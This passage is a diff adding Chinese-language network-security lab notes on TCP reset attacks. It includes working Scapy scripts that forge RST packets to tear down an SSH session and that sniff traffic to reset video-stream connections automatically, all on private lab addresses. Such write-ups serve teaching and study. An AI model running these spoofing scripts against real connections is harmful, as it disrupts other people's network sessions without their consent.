@@ -69,4 +69,74 @@ send(pkt, verbose=0)
 !!! warning
 
     wireshark中找序列号容易出错，一定要找最后一行服务端发给客户端的包  
-    
+    要用sudo权限
+
+## SSH连接中的TCP复位攻击
+
+!!! ssh连接
+
+    SSH的TCP连接是加密的，但是只加密了TCP数据，而不加密TCP头。即这个加密是在网络层之上的传输层进行的。因为
+    TCP复位攻击只需要伪造TCP头部，不需要加装任何数据，故TCP复位攻击可以成功。
+
+1、客户端ssh到服务端
+![正常ssh](../img/tcp-ssh-normal.png)
+
+2、确定需要设置的参数  
+![抓ssh包](../img/tcp-ssh-wireshark.png)
+
+可以看到源端口号22，目标端口号44950，下一个序列号2920417518  
+
+3、宿主机发动复位攻击
+
+```python
+#!/usr/bin/python3
+import sys
+from scapy.all import *
+
+print("SENDING RESET PACKET.....")
+IPLayer = IP(src="192.168.230.150", dst="192.168.230.151")
+TCPLayer = TCP(sport=22, dport=44950, flags="R", seq=2920417518)
+pkt = IPLayer/TCPLayer
+ls(pkt)
+send(pkt, verbose=0)
+```
+![发动攻击](../img/tcp-attack-ssh.png)
+
+4、可以看到客户端ssh被断开
+![被攻击](../img/tcp-ssh-beattack.png)
+
+!!! warning
+
+    wireshark输入ssh过滤显示  
+    发动攻击时一定要用sudo权限！  
+
+## 视频流连接中的TCP复位攻击
+
+!!! 视频流攻击难点
+
+    在于如何找序列号，这个过程不能在telnet终端输入任何内容，否则下一个序列号值会增加，由于没有办法停止
+    客户端和服务器之间的数据包，因此序列号增长的很快，无法使用手动方式来攻击。
+
+```python
+#!/usr/bin/python3
+from scapy.all import *
+
+
+def spoof_tcp(pkt):
+    IPLayer = IP(dst="192.168.230.1", src=pkt[IP].dst)
+    TCPLayer = TCP(flags="R", seq=pkt[TCP].ack, dport=pkt[TCP].sport, sport=pkt[TCP].dport)
+    spoofpkt = IPLayer/TCPLayer
+    send(spoofpkt, verbose=0)
+
+pkt = sniff(filter='tcp and src host 192.168.230.1', prn=spoof_tcp)
+
+```
+
+1、打开youtube.com的某一个视频  
+2、执行攻击脚本，没有达到预期效果  
+
+!!! warning
+
+    ubuntu虚拟机提供的firefox浏览器无法播放视频，改成用宿主机播放，执行脚本不起作用
+
+
